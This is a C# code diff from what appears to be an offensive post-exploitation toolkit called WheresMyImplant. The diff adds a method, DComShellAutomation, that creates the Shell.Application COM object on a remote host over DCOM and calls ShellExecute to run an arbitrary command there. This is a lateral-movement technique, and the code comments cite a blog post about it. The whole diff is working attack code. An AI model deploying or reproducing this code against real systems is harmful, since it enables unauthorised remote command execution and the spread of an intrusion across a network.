@@ -591,6 +591,40 @@ namespace WheresMyImplant
 
         // DangerZone - Untested
         ////////////////////////////////////////////////////////////////////////////////
+        //
+        ////////////////////////////////////////////////////////////////////////////////
+        public static void DComShellAutomation(String target, String command, String arguments)
+        {
+            String[] split = command.Split(new String[] { @"\" }, StringSplitOptions.RemoveEmptyEntries);
+            String executable = split.LastOrDefault();
+            String path = String.Join(@"\", split.Take(split.Length - 1).ToArray());
+
+            try
+            {
+                Console.WriteLine("Executing {0} {1} ({2}) on {3}", executable, arguments, path, target);
+                Type comType = Type.GetTypeFromCLSID(new Guid("13709620-C279-11CE-A49E-444553540000"), target);
+                Object instance = Activator.CreateInstance(comType);
+                instance.GetType().InvokeMember("ShellExecute", BindingFlags.InvokeMethod, null, instance, new Object[] { executable, arguments, null, null, 0 });
+            }
+            catch (Exception ex)
+            {
+                if (ex is System.Runtime.InteropServices.COMException)
+                {
+                    if (ex.Message.Contains("800702e4"))
+                        Console.WriteLine("The requested operation requires elevation(0x800702E4)");
+                    else
+                        Console.WriteLine(ex.Message);
+                }
+                else
+                {
+                    Console.WriteLine(ex.ToString());
+                }
+            }
+        }
+
+
+        // DangerZone - Untested
+        ////////////////////////////////////////////////////////////////////////////////
         //https://www.cybereason.com/blog/dcom-lateral-movement-techniques
         ////////////////////////////////////////////////////////////////////////////////
         public static void DComVisio(String target, String command)
